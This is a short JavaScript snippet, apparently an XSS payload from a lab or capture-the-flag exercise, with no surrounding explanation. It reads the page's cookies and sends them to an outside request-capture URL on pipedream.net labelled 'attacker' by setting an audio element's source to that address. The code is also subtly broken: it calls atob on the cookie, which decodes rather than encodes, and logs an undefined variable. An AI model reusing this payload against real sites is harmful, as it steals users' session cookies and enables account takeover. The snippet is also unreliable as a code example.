
attacker = "https://eolkkqvs1uis9pt.m.pipedream.net";

cook = atob(document.cookie);

aud = document.getElementById("aud1");
aud.src = attacker + "/?" + cook;

console.log(cookie);
